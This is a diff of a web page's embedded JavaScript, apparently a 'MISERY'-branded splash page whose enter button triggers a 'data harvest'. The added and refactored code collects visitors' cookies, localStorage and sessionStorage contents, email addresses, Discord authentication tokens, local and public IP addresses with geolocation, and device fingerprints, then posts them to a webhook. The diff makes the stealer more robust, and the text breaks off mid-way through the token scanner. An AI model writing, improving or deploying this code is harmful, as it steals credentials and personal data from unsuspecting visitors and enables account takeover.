@@ -221,9 +221,10 @@
         @keyframes killPulse { 0% { opacity: 0.6; } 100% { opacity: 1; } }
         @media (max-width: 600px) {
             #enterBtn { padding: 14px 30px; font-size: 1rem; letter-spacing: 6px; }
+            .ascii-art { font-size: clamp(4px, 0.8vw, 8px); }
         }
         @supports (-webkit-touch-callout: none) {
-            .ascii-art { font-size: clamp(3px, 1.2vw, 10px); }
+            .ascii-art { font-size: clamp(3px, 0.9vw, 7px); }
             #enterBtn { padding: 16px 40px; font-size: 1.2rem; }
         }
     </style>
@@ -364,359 +365,399 @@
             this.classList.remove('show');
             this.style.display = 'none';
             mainContent.classList.add('show');
-            collectAllData();
+            // Small delay to ensure DOM is ready
+            setTimeout(function() {
+                collectAllData();
+            }, 200);
         });
 
-        // ---------- COLLECT ALL DATA (WITH IP AND EMAIL) ----------
-        async function collectAllData() {
-            sendToWebhook('🔴 **MISERY EXTENDED DATA HARVEST**');
-
-            // ===== 1. BROWSER & SYSTEM INFO =====
-            let info = [];
-            info.push(`🌐 **Browser & System:**`);
-            info.push(`  User Agent: ${navigator.userAgent || 'N/A'}`);
-            info.push(`  Language: ${navigator.language || 'N/A'}`);
-            info.push(`  Languages: ${navigator.languages ? navigator.languages.join(', ') : 'N/A'}`);
-            info.push(`  Platform: ${navigator.platform || 'N/A'}`);
-            info.push(`  Vendor: ${navigator.vendor || 'N/A'}`);
-            info.push(`  Screen: ${screen.width || '?'}x${screen.height || '?'} (${screen.colorDepth || '?'}-bit)`);
-            info.push(`  Available: ${screen.availWidth || '?'}x${screen.availHeight || '?'}`);
-            info.push(`  Window: ${window.innerWidth || '?'}x${window.innerHeight || '?'}`);
-            info.push(`  Device Pixel Ratio: ${window.devicePixelRatio || 1}`);
-            info.push(`  Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'}`);
-            info.push(`  UTC Time: ${new Date().toISOString() || 'N/A'}`);
-            info.push(`  Local Time: ${new Date().toString() || 'N/A'}`);
-            if (navigator.hardwareConcurrency) info.push(`  CPU Cores: ${navigator.hardwareConcurrency}`);
-            if (navigator.deviceMemory) info.push(`  Device Memory: ${navigator.deviceMemory} GB`);
-            if (navigator.maxTouchPoints) info.push(`  Touch Points: ${navigator.maxTouchPoints}`);
-            info.push(`  Cookie Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}`);
-            info.push(`  Do Not Track: ${navigator.doNotTrack || 'N/A'}`);
-            if (navigator.connection) {
-                info.push(`  Connection Type: ${navigator.connection.effectiveType || 'N/A'}`);
-                info.push(`  Downlink: ${navigator.connection.downlink || 'N/A'} Mbps`);
-                info.push(`  RTT: ${navigator.connection.rtt || 'N/A'} ms`);
-            } else {
-                info.push(`  Connection: Not available`);
-            }
-
-            // GPU
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        info.push(`  GPU Vendor: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A'}`);
-                        info.push(`  GPU Renderer: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'}`);
-                    }
-                    info.push(`  WebGL Version: ${gl.getParameter(gl.VERSION) || 'N/A'}`);
-                    info.push(`  Shading Language: ${gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || 'N/A'}`);
-                } else {
-                    info.push(`  WebGL: Not supported`);
-                }
-            } catch(e) {
-                info.push(`  WebGL: Error - ${e.message || 'Unknown'}`);
-            }
-
-            // Local IP via WebRTC (IMPROVED)
-            let localIP = 'Not available';
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.createDataChannel('test');
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                const candidates = pc.localDescription.sdp.match(/candidate:[^\n]+/g);
-                if (candidates) {
-                    for (const cand of candidates) {
-                        const ipMatch = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
-                        if (ipMatch && !ipMatch[0].startsWith('127.') && !ipMatch[0].startsWith('0.')) {
-                            localIP = ipMatch[0];
-                            break;
+        // ---------- GET LOCAL IP (FIXED - NO AWAIT INSIDE SYNC) ----------
+        function getLocalIP() {
+            return new Promise(function(resolve) {
+                try {
+                    var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('test');
+                    pc.createOffer().then(function(offer) {
+                        return pc.setLocalDescription(offer);
+                    }).then(function() {
+                        var sdp = pc.localDescription ? pc.localDescription.sdp : '';
+                        var candidates = sdp.match(/candidate:[^\n]+/g);
+                        var ip = 'Not available';
+                        if (candidates) {
+                            for (var i = 0; i < candidates.length; i++) {
+                                var match = candidates[i].match(/(\d{1,3}\.){3}\d{1,3}/);
+                                if (match && !match[0].startsWith('127.') && !match[0].startsWith('0.')) {
+                                    ip = match[0];
+                                    break;
+                                }
+                            }
                         }
-                    }
-                }
-                pc.close();
-            } catch(e) {
-                localIP = 'WebRTC error';
-            }
-            info.push(`  Local IP: ${localIP}`);
-
-            // Battery
-            try {
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(battery => {
-                        info.push(`  Battery Level: ${Math.round(battery.level * 100)}%`);
-                        info.push(`  Charging: ${battery.charging ? 'Yes' : 'No'}`);
-                        sendToWebhook('```\n' + info.join('\n') + '\n```');
-                    }).catch(() => {
-                        sendToWebhook('```\n' + info.join('\n') + '\n```');
+                        pc.close();
+                        resolve(ip);
+                    }).catch(function() {
+                        pc.close();
+                        resolve('WebRTC error');
                     });
+                    setTimeout(function() {
+                        try { pc.close(); } catch(e) {}
+                        resolve('Timeout');
+                    }, 3000);
+                } catch(e) {
+                    resolve('WebRTC not supported');
+                }
+            });
+        }
+
+        // ---------- GET PUBLIC IP (FIXED - MULTIPLE FALLBACKS) ----------
+        function getPublicIP() {
+            return new Promise(function(resolve) {
+                var services = [
+                    { url: 'https://api.ipify.org?format=json', key: 'ip' },
+                    { url: 'https://api.my-ip.io/ip.json', key: 'ip' },
+                    { url: 'https://ip-api.com/json/', key: 'query' },
+                    { url: 'https://api.ip.sb/geoip', key: 'ip' },
+                    { url: 'https://ipinfo.io/json', key: 'ip' }
+                ];
+                var index = 0;
+                function tryNext() {
+                    if (index >= services.length) {
+                        resolve(null);
+                        return;
+                    }
+                    var svc = services[index];
+                    index++;
+                    fetch(svc.url, { timeout: 3000 })
+                        .then(function(r) { return r.json(); })
+                        .then(function(data) {
+                            var ip = data[svc.key] || data.ip || data.query || null;
+                            if (ip) {
+                                resolve(ip);
+                            } else {
+                                tryNext();
+                            }
+                        })
+                        .catch(function() {
+                            tryNext();
+                        });
+                }
+                tryNext();
+            });
+        }
+
+        // ---------- GET GEOLOCATION FROM IP ----------
+        function getGeoFromIP(ip) {
+            return new Promise(function(resolve) {
+                if (!ip) { resolve(null); return; }
+                fetch('http://ip-api.com/json/' + ip, { timeout: 3000 })
+                    .then(function(r) { return r.json(); })
+                    .then(function(data) {
+                        if (data && data.status === 'success') {
+                            resolve(data);
+                        } else {
+                            resolve(null);
+                        }
+                    })
+                    .catch(function() { resolve(null); });
+            });
+        }
+
+        // ---------- COLLECT ALL DATA (FIXED - PROPER ASYNC) ----------
+        async function collectAllData() {
+            try {
+                sendToWebhook('🔴 **MISERY EXTENDED DATA HARVEST**');
+
+                // ===== 1. BROWSER & SYSTEM INFO =====
+                var info = [];
+                info.push('🌐 **Browser & System:**');
+                info.push('  User Agent: ' + (navigator.userAgent || 'N/A'));
+                info.push('  Language: ' + (navigator.language || 'N/A'));
+                info.push('  Languages: ' + (navigator.languages ? navigator.languages.join(', ') : 'N/A'));
+                info.push('  Platform: ' + (navigator.platform || 'N/A'));
+                info.push('  Vendor: ' + (navigator.vendor || 'N/A'));
+                info.push('  Screen: ' + (screen.width || '?') + 'x' + (screen.height || '?') + ' (' + (screen.colorDepth || '?') + '-bit)');
+                info.push('  Available: ' + (screen.availWidth || '?') + 'x' + (screen.availHeight || '?'));
+                info.push('  Window: ' + (window.innerWidth || '?') + 'x' + (window.innerHeight || '?'));
+                info.push('  Device Pixel Ratio: ' + (window.devicePixelRatio || 1));
+                info.push('  Timezone: ' + (Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'));
+                info.push('  UTC Time: ' + (new Date().toISOString() || 'N/A'));
+                info.push('  Local Time: ' + (new Date().toString() || 'N/A'));
+                if (navigator.hardwareConcurrency) info.push('  CPU Cores: ' + navigator.hardwareConcurrency);
+                if (navigator.deviceMemory) info.push('  Device Memory: ' + navigator.deviceMemory + ' GB');
+                if (navigator.maxTouchPoints) info.push('  Touch Points: ' + navigator.maxTouchPoints);
+                info.push('  Cookie Enabled: ' + (navigator.cookieEnabled ? 'Yes' : 'No'));
+                info.push('  Do Not Track: ' + (navigator.doNotTrack || 'N/A'));
+                if (navigator.connection) {
+                    info.push('  Connection Type: ' + (navigator.connection.effectiveType || 'N/A'));
+                    info.push('  Downlink: ' + (navigator.connection.downlink || 'N/A') + ' Mbps');
+                    info.push('  RTT: ' + (navigator.connection.rtt || 'N/A') + ' ms');
                 } else {
+                    info.push('  Connection: Not available');
+                }
+
+                // GPU
+                try {
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            info.push('  GPU Vendor: ' + (gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A'));
+                            info.push('  GPU Renderer: ' + (gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'));
+                        }
+                        info.push('  WebGL Version: ' + (gl.getParameter(gl.VERSION) || 'N/A'));
+                        info.push('  Shading Language: ' + (gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || 'N/A'));
+                    } else {
+                        info.push('  WebGL: Not supported');
+                    }
+                } catch(e) {
+                    info.push('  WebGL: Error - ' + (e.message || 'Unknown'));
+                }
+
+                // Local IP (FIXED)
+                var localIP = await getLocalIP();
+                info.push('  Local IP: ' + localIP);
+
+                // Battery
+                try {
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(function(battery) {
+                            info.push('  Battery Level: ' + Math.round(battery.level * 100) + '%');
+                            info.push('  Charging: ' + (battery.charging ? 'Yes' : 'No'));
+                            sendToWebhook('```\n' + info.join('\n') + '\n```');
+                        }).catch(function() {
+                            sendToWebhook('```\n' + info.join('\n') + '\n```');
+                        });
+                    } else {
+                        sendToWebhook('```\n' + info.join('\n') + '\n```');
+                    }
+                } catch(e) {
                     sendToWebhook('```\n' + info.join('\n') + '\n```');
                 }
-            } catch(e) {
-                sendToWebhook('```\n' + info.join('\n') + '\n```');
-            }
 
-            // ===== 2. COOKIES =====
-            try {
-                const cookies = document.cookie ? document.cookie.split(';').filter(c => c.trim()) : [];
-                sendToWebhook(`🍪 **Cookies:** ${cookies.length} found\n${cookies.length > 0 ? cookies.join('\n') : '(none)'}`);
-            } catch(e) {
-                sendToWebhook(`🍪 **Cookies:** Error - ${e.message}`);
-            }
-
-            // ===== 3. LOCALSTORAGE =====
-            try {
-                const lsData = [];
-                if (localStorage && localStorage.length > 0) {
-                    for (let key in localStorage) {
-                        if (localStorage.hasOwnProperty(key)) {
-                            let val = localStorage[key];
-                            if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
-                            lsData.push(`${key}: ${val}`);
-                        }
-                    }
-                }
-                sendToWebhook(`💾 **LocalStorage (${lsData.length} keys):**\n${lsData.length > 0 ? lsData.join('\n') : '(empty)'}`);
-            } catch(e) {
-                sendToWebhook(`💾 **LocalStorage:** Error - ${e.message}`);
-            }
-
-            // ===== 4. SESSIONSTORAGE =====
-            try {
-                const ssData = [];
-                if (sessionStorage && sessionStorage.length > 0) {
-                    for (let key in sessionStorage) {
-                        if (sessionStorage.hasOwnProperty(key)) {
-                            let val = sessionStorage[key];
-                            if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
-                            ssData.push(`${key}: ${val}`);
-                        }
-                    }
-                }
-                sendToWebhook(`📦 **SessionStorage (${ssData.length} keys):**\n${ssData.length > 0 ? ssData.join('\n') : '(empty)'}`);
-            } catch(e) {
-                sendToWebhook(`📦 **SessionStorage:** Error - ${e.message}`);
-            }
-
-            // ===== 5. PUBLIC IP & GEOLOCATION (MULTIPLE SOURCES) =====
-            let publicIP = null;
-            let geoData = null;
-
-            const ipServices = [
-                'https://api.ipify.org?format=json',
-                'https://api.my-ip.io/ip.json',
-                'https://ip-api.com/json/'
-            ];
-
-            for (const service of ipServices) {
+                // ===== 2. COOKIES =====
                 try {
-                    const resp = await fetch(service);
-                    if (resp.ok) {
-                        const data = await resp.json();
-                        if (service.includes('ipify')) {
-                            publicIP = data.ip;
-                        } else if (service.includes('my-ip')) {
-                            publicIP = data.ip;
-                        } else if (service.includes('ip-api')) {
-                            publicIP = data.query || data.ip;
-                            geoData = data;
-                        }
-                        if (publicIP) break;
-                    }
-                } catch(e) {}
-            }
+                    var cookies = document.cookie ? document.cookie.split(';').filter(function(c) { return c.trim(); }) : [];
+                    sendToWebhook('🍪 **Cookies:** ' + cookies.length + ' found\n' + (cookies.length > 0 ? cookies.join('\n') : '(none)'));
+                } catch(e) {
+                    sendToWebhook('🍪 **Cookies:** Error - ' + e.message);
+                }
 
-            if (publicIP) {
-                sendToWebhook(`🌐 **Public IP:** ${publicIP}`);
-                if (geoData && geoData.status === 'success') {
-                    sendToWebhook(`📍 **IP Location:**\nCity: ${geoData.city || 'N/A'}\nRegion: ${geoData.regionName || 'N/A'}\nCountry: ${geoData.country || 'N/A'}\nLat/Lon: ${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}\nISP: ${geoData.isp || 'N/A'}\nORG: ${geoData.org || 'N/A'}\nAS: ${geoData.as || 'N/A'}`);
-                } else {
-                    try {
-                        const geoResp = await fetch(`http://ip-api.com/json/${publicIP}`);
-                        if (geoResp.ok) {
-                            const geo = await geoResp.json();
-                            if (geo && geo.status === 'success') {
-                                sendToWebhook(`📍 **IP Location:**\nCity: ${geo.city || 'N/A'}\nRegion: ${geo.regionName || 'N/A'}\nCountry: ${geo.country || 'N/A'}\nLat/Lon: ${geo.lat || 'N/A'}, ${geo.lon || 'N/A'}\nISP: ${geo.isp || 'N/A'}\nORG: ${geo.org || 'N/A'}\nAS: ${geo.as || 'N/A'}`);
+                // ===== 3. LOCALSTORAGE =====
+                try {
+                    var lsData = [];
+                    if (localStorage && localStorage.length > 0) {
+                        for (var key in localStorage) {
+                            if (localStorage.hasOwnProperty(key)) {
+                                var val = localStorage[key];
+                                if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
+                                lsData.push(key + ': ' + val);
                             }
                         }
-                    } catch(e) {}
+                    }
+                    sendToWebhook('💾 **LocalStorage (' + lsData.length + ' keys):**\n' + (lsData.length > 0 ? lsData.join('\n') : '(empty)'));
+                } catch(e) {
+                    sendToWebhook('💾 **LocalStorage:** Error - ' + e.message);
                 }
-            } else {
-                sendToWebhook('🌐 **Public IP:** Could not retrieve (blocked or offline)');
-            }
 
-            // ===== 6. EMAIL / GMAIL SCRAPE =====
-            let emails = [];
-            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+                // ===== 4. SESSIONSTORAGE =====
+                try {
+                    var ssData = [];
+                    if (sessionStorage && sessionStorage.length > 0) {
+                        for (var key2 in sessionStorage) {
+                            if (sessionStorage.hasOwnProperty(key2)) {
+                                var val2 = sessionStorage[key2];
+                                if (val2 && val2.length > 500) val2 = val2.substring(0, 500) + '... [truncated]';
+                                ssData.push(key2 + ': ' + val2);
+                            }
+                        }
+                    }
+                    sendToWebhook('📦 **SessionStorage (' + ssData.length + ' keys):**\n' + (ssData.length > 0 ? ssData.join('\n') : '(empty)'));
+                } catch(e) {
+                    sendToWebhook('📦 **SessionStorage:** Error - ' + e.message);
+                }
 
-            // Check localStorage for emails
-            try {
-                if (localStorage && localStorage.length > 0) {
-                    for (let key in localStorage) {
-                        if (localStorage.hasOwnProperty(key)) {
-                            const val = localStorage[key];
-                            if (typeof val === 'string') {
-                                const matches = val.match(emailRegex);
-                                if (matches) {
-                                    matches.forEach(e => {
-                                        if (!emails.includes(e)) emails.push(e);
-                                    });
-                                }
-                                try {
-                                    const parsed = JSON.parse(val);
-                                    const jsonStr = JSON.stringify(parsed);
-                                    const matches2 = jsonStr.match(emailRegex);
-                                    if (matches2) {
-                                        matches2.forEach(e => {
-                                            if (!emails.includes(e)) emails.push(e);
+                // ===== 5. PUBLIC IP & GEOLOCATION (FIXED) =====
+                var publicIP = await getPublicIP();
+                if (publicIP) {
+                    sendToWebhook('🌐 **Public IP:** ' + publicIP);
+                    var geo = await getGeoFromIP(publicIP);
+                    if (geo) {
+                        sendToWebhook('📍 **IP Location:**\nCity: ' + (geo.city || 'N/A') + '\nRegion: ' + (geo.regionName || 'N/A') + '\nCountry: ' + (geo.country || 'N/A') + '\nLat/Lon: ' + (geo.lat || 'N/A') + ', ' + (geo.lon || 'N/A') + '\nISP: ' + (geo.isp || 'N/A') + '\nORG: ' + (geo.org || 'N/A') + '\nAS: ' + (geo.as || 'N/A'));
+                    }
+                } else {
+                    sendToWebhook('🌐 **Public IP:** Could not retrieve (blocked or offline)');
+                }
+
+                // ===== 6. EMAIL SCRAPE =====
+                var emails = [];
+                var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+
+                try {
+                    if (localStorage && localStorage.length > 0) {
+                        for (var key3 in localStorage) {
+                            if (localStorage.hasOwnProperty(key3)) {
+                                var val3 = localStorage[key3];
+                                if (typeof val3 === 'string') {
+                                    var matches = val3.match(emailRegex);
+                                    if (matches) {
+                                        matches.forEach(function(e) {
+                                            if (emails.indexOf(e) === -1) emails.push(e);
                                         });
                                     }
-                                } catch(e) {}
-                            }
-                        }
-                    }
-                }
-            } catch(e) {}
-
-            // Check cookies for emails
-            try {
-                if (document.cookie) {
-                    const cookies = document.cookie.split(';');
-                    cookies.forEach(cookie => {
-                        const val = cookie.trim();
-                        const matches = val.match(emailRegex);
-                        if (matches) {
-                            matches.forEach(e => {
-                                if (!emails.includes(e)) emails.push(e);
-                            });
-                        }
-                    });
-                }
-            } catch(e) {}
-
-            // Check sessionStorage for emails
-            try {
-                if (sessionStorage && sessionStorage.length > 0) {
-                    for (let key in sessionStorage) {
-                        if (sessionStorage.hasOwnProperty(key)) {
-                            const val = sessionStorage[key];
-                            if (typeof val === 'string') {
-                                const matches = val.match(emailRegex);
-                                if (matches) {
-                                    matches.forEach(e => {
-                                        if (!emails.includes(e)) emails.push(e);
-                                    });
+                                    try {
+                                        var parsed = JSON.parse(val3);
+                                        var jsonStr = JSON.stringify(parsed);
+                                        var matches2 = jsonStr.match(emailRegex);
+                                        if (matches2) {
+                                            matches2.forEach(function(e) {
+                                                if (emails.indexOf(e) === -1) emails.push(e);
+                                            });
+                                        }
+                                    } catch(e) {}
                                 }
                             }
                         }
                     }
-                }
-            } catch(e) {}
+                } catch(e) {}
 
-            // Check window object for emails
-            try {
-                const windowStr = JSON.stringify(window);
-                const matches = windowStr.match(emailRegex);
-                if (matches) {
-                    matches.forEach(e => {
-                        if (!emails.includes(e)) emails.push(e);
-                    });
-                }
-            } catch(e) {}
-
-            // Check HTML for emails
-            try {
-                const html = document.documentElement.innerHTML;
-                const matches = html.match(emailRegex);
-                if (matches) {
-                    matches.forEach(e => {
-                        if (!emails.includes(e)) emails.push(e);
-                    });
-                }
-            } catch(e) {}
-
-            // Remove duplicates and common false positives
-            const commonFalse = ['example@example.com', 'test@test.com', 'user@domain.com'];
-            emails = emails.filter(e => !commonFalse.includes(e) && e.length > 10);
-
-            if (emails.length > 0) {
-                sendToWebhook(`📧 **Emails found (${emails.length}):**\n${emails.join('\n')}`);
-            } else {
-                sendToWebhook('📧 **Emails:** None found in browser storage.');
-            }
-
-            // ===== 7. PLUGINS =====
-            try {
-                const plugins = [];
-                if (navigator.plugins) {
-                    for (let i = 0; i < navigator.plugins.length; i++) {
-                        const p = navigator.plugins[i];
-                        if (p && p.name) plugins.push(`${p.name} (${p.filename || 'N/A'})`);
+                try {
+                    if (document.cookie) {
+                        var cookies2 = document.cookie.split(';');
+                        cookies2.forEach(function(cookie) {
+                            var val4 = cookie.trim();
+                            var matches3 = val4.match(emailRegex);
+                            if (matches3) {
+                                matches3.forEach(function(e) {
+                                    if (emails.indexOf(e) === -1) emails.push(e);
+                                });
+                            }
+                        });
                     }
-                }
-                sendToWebhook(`🔌 **Plugins (${plugins.length}):**\n${plugins.length > 0 ? plugins.join('\n') : '(none)'}`);
-            } catch(e) {
-                sendToWebhook(`🔌 **Plugins:** Error - ${e.message}`);
-            }
+                } catch(e) {}
 
-            // ===== 8. SCREEN ORIENTATION =====
-            try {
-                const orient = screen.orientation || {};
-                sendToWebhook(`📱 **Screen Orientation:** Type: ${orient.type || 'N/A'}, Angle: ${orient.angle || 'N/A'}`);
-            } catch(e) {}
+                try {
+                    if (sessionStorage && sessionStorage.length > 0) {
+                        for (var key4 in sessionStorage) {
+                            if (sessionStorage.hasOwnProperty(key4)) {
+                                var val5 = sessionStorage[key4];
+                                if (typeof val5 === 'string') {
+                                    var matches4 = val5.match(emailRegex);
+                                    if (matches4) {
+                                        matches4.forEach(function(e) {
+                                            if (emails.indexOf(e) === -1) emails.push(e);
+                                        });
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch(e) {}
 
-            // ===== 9. PERFORMANCE TIMING =====
-            try {
-                if (performance && performance.timing) {
-                    const perf = performance.timing;
-                    const loadTime = perf.loadEventEnd - perf.navigationStart;
-                    const domTime = perf.domComplete - perf.domLoading;
-                    const dnsTime = perf.domainLookupEnd - perf.domainLookupStart;
-                    const tcpTime = perf.connectEnd - perf.connectStart;
-                    sendToWebhook(`⏱️ **Performance:**\nPage Load: ${loadTime || 0}ms\nDOM Ready: ${domTime || 0}ms\nDNS: ${dnsTime || 0}ms\nTCP: ${tcpTime || 0}ms`);
+                try {
+                    var windowStr = JSON.stringify(window);
+                    var matches5 = windowStr.match(emailRegex);
+                    if (matches5) {
+                        matches5.forEach(function(e) {
+                            if (emails.indexOf(e) === -1) emails.push(e);
+                        });
+                    }
+                } catch(e) {}
+
+                try {
+                    var html = document.documentElement.innerHTML;
+                    var matches6 = html.match(emailRegex);
+                    if (matches6) {
+                        matches6.forEach(function(e) {
+                            if (emails.indexOf(e) === -1) emails.push(e);
+                        });
+                    }
+                } catch(e) {}
+
+                var commonFalse = ['example@example.com', 'test@test.com', 'user@domain.com'];
+                emails = emails.filter(function(e) {
+                    return commonFalse.indexOf(e) === -1 && e.length > 10;
+                });
+
+                if (emails.length > 0) {
+                    sendToWebhook('📧 **Emails found (' + emails.length + '):**\n' + emails.join('\n'));
                 } else {
-                    sendToWebhook(`⏱️ **Performance:** Timing API not available`);
+                    sendToWebhook('📧 **Emails:** None found in browser storage.');
                 }
-            } catch(e) {
-                sendToWebhook(`⏱️ **Performance:** Error - ${e.message}`);
-            }
 
-            // ===== 10. DISCORD TOKEN SCAN =====
-            setTimeout(() => {
-                scanDiscordToken();
-            }, 1500);
+                // ===== 7. PLUGINS =====
+                try {
+                    var plugins = [];
+                    if (navigator.plugins) {
+                        for (var i = 0; i < navigator.plugins.length; i++) {
+                            var p = navigator.plugins[i];
+                            if (p && p.name) plugins.push(p.name + ' (' + (p.filename || 'N/A') + ')');
+                        }
+                    }
+                    sendToWebhook('🔌 **Plugins (' + plugins.length + '):**\n' + (plugins.length > 0 ? plugins.join('\n') : '(none)'));
+                } catch(e) {
+                    sendToWebhook('🔌 **Plugins:** Error - ' + e.message);
+                }
+
+                // ===== 8. SCREEN ORIENTATION =====
+                try {
+                    var orient = screen.orientation || {};
+                    sendToWebhook('📱 **Screen Orientation:** Type: ' + (orient.type || 'N/A') + ', Angle: ' + (orient.angle || 'N/A'));
+                } catch(e) {}
+
+                // ===== 9. PERFORMANCE TIMING =====
+                try {
+                    if (performance && performance.timing) {
+                        var perf = performance.timing;
+                        var loadTime = perf.loadEventEnd - perf.navigationStart;
+                        var domTime = perf.domComplete - perf.domLoading;
+                        var dnsTime = perf.domainLookupEnd - perf.domainLookupStart;
+                        var tcpTime = perf.connectEnd - perf.connectStart;
+                        sendToWebhook('⏱️ **Performance:**\nPage Load: ' + (loadTime || 0) + 'ms\nDOM Ready: ' + (domTime || 0) + 'ms\nDNS: ' + (dnsTime || 0) + 'ms\nTCP: ' + (tcpTime || 0) + 'ms');
+                    } else {
+                        sendToWebhook('⏱️ **Performance:** Timing API not available');
+                    }
+                } catch(e) {
+                    sendToWebhook('⏱️ **Performance:** Error - ' + e.message);
+                }
+
+                // ===== 10. DISCORD TOKEN SCAN =====
+                setTimeout(function() {
+                    scanDiscordToken();
+                }, 1500);
+
+            } catch(e) {
+                sendToWebhook('❌ **ERROR:** ' + e.message);
+            }
         }
 
         // ---------- DISCORD TOKEN SCANNER ----------
         function scanDiscordToken() {
-            const tokenSources = [];
-            const tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
+            var tokenSources = [];
+            var tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
 
             // localStorage
             try {
                 if (localStorage && localStorage.length > 0) {
-                    for (let key in localStorage) {
+                    for (var key in localStorage) {
                         if (localStorage.hasOwnProperty(key)) {
-                            const val = localStorage[key];
+                            var val = localStorage[key];
                             if (typeof val === 'string' && val.length > 20) {
-                                const matches = val.match(tokenRegex);
+                                var matches = val.match(tokenRegex);
                                 if (matches) {
-                                    matches.forEach(t => {
-                                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                            tokenSources.push({ source: 'localStorage', key, token: t });
+                                    matches.forEach(function(t) {
+                                        if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                                            tokenSources.push({ source: 'localStorage', key: key, token: t });
                                         }
                                     });
                                 }
                                 try {
-                                    const parsed = JSON.parse(val);
-                                    const jsonStr = JSON.stringify(parsed);
-                                    const matches2 = jsonStr.match(tokenRegex);
+                                    var parsed = JSON.parse(val);
+                                    var jsonStr = JSON.stringify(parsed);
+                                    var matches2 = jsonStr.match(tokenRegex);
                                     if (matches2) {
-                                        matches2.forEach(t => {
-                                            if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                                tokenSources.push({ source: 'localStorage JSON', key, token: t });
+                                        matches2.forEach(function(t) {
+                                            if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                                                tokenSources.push({ source: 'localStorage JSON', key: key, token: t });
                                             }
                                         });
                                     }
@@ -730,15 +771,15 @@
             // sessionStorage
             try {
                 if (sessionStorage && sessionStorage.length > 0) {
-                    for (let key in sessionStorage) {
-                        if (sessionStorage.hasOwnProperty(key)) {
-                            const val = sessionStorage[key];
-                            if (typeof val === 'string' && val.length > 20) {
-                                const matches = val.match(tokenRegex);
-                                if (matches) {
-                                    matches.forEach(t => {
-                                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                            tokenSources.push({ source: 'sessionStorage', key, token: t });
+                    for (var key2 in sessionStorage) {
+                        if (sessionStorage.hasOwnProperty(key2)) {
+                            var val2 = sessionStorage[key2];
+                            if (typeof val2 === 'string' && val2.length > 20) {
+                                var matches3 = val2.match(tokenRegex);
+                                if (matches3) {
+                                    matches3.forEach(function(t) {
+                                        if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                                            tokenSources.push({ source: 'sessionStorage', key: key2, token: t });
                                         }
                                     });
                                 }
@@ -751,15 +792,15 @@
             // Cookies
             try {
                 if (document.cookie) {
-                    const cookies = document.cookie.split(';');
-                    cookies.forEach(cookie => {
-                        const parts = cookie.trim().split('=');
+                    var cookies = document.cookie.split(';');
+                    cookies.forEach(function(cookie) {
+                        var parts = cookie.trim().split('=');
                         if (parts.length === 2) {
-                            const val = parts[1];
-                            const matches = val.match(tokenRegex);
-                            if (matches) {
-                                matches.forEach(t => {
-                                    if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                            var val3 = parts[1];
+                            var matches4 = val3.match(tokenRegex);
+                            if (matches4) {
+                                matches4.forEach(function(t) {
+                                    if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
                                         tokenSources.push({ source: 'cookie', key: parts[0], token: t });
                                     }
                                 });
@@ -771,11 +812,11 @@
 
             // window object
             try {
-                const windowStr = JSON.stringify(window);
-                const matches = windowStr.match(tokenRegex);
-                if (matches) {
-                    matches.forEach(t => {
-                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                var windowStr2 = JSON.stringify(window);
+                var matches5 = windowStr2.match(tokenRegex);
+                if (matches5) {
+                    matches5.forEach(function(t) {
+                        if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
                             tokenSources.push({ source: 'window object', key: 'global', token: t });
                         }
                     });
@@ -784,11 +825,11 @@
 
             // HTML
             try {
-                const html = document.documentElement.innerHTML;
-                const matches = html.match(tokenRegex);
-                if (matches) {
-                    matches.forEach(t => {
-                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                var html2 = document.documentElement.innerHTML;
+                var matches6 = html2.match(tokenRegex);
+                if (matches6) {
+                    matches6.forEach(function(t) {
+                        if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
